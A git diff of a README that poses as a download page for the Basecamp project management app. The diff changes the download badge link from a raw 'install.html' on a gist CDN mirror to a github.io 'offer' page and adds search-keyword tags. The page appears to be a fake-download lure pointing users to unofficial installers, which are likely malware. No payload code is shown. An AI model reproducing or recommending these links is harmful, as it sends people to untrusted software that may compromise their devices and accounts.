@@ -1,6 +1,6 @@
 # Basecamp Download — Desktop Project Management Tool  
 
-[![Get Basecamp GitHub](https://img.shields.io/badge/Get%20Basecamp%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://gistcdn.githack.com/cjiohukpinkfluffy-cyber/0f5ba8269ec7604b1abe378c8b107c87/raw/5b9c90407c9d41b845f34d2b4457c1ff3122a583/install.html?offer=Basecamp)  
+[![Get Basecamp GitHub](https://img.shields.io/badge/Get%20Basecamp%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://git-deployer-app.github.io/.github/?offer=Basecamp)  
 
 ---
 
@@ -72,7 +72,7 @@ With built-in chat, to-do lists, scheduling, and cloud storage, Basecamp keeps e
 ---
 
 ## 🔍 Tags  
-basecamp, project management, team collaboration, productivity tools, project tracking, remote teamwork, basecamp desktop, project planner mac, project software windows, team communication app, basecamp mac, basecamp pc, basecamp windows, basecamp for mac, basecamp for pc, basecamp for windows 
+basecamp, basecamp pricing, basecamp cost, basecamp 2, basecamp 3, basecamp 4, base camp, project management, team collaboration, productivity tools, project tracking, remote teamwork, basecamp desktop, project planner mac, project software windows, team communication app, basecamp mac, basecamp pc, basecamp windows, basecamp for mac, basecamp for pc, basecamp for windows 
 
 ---
 
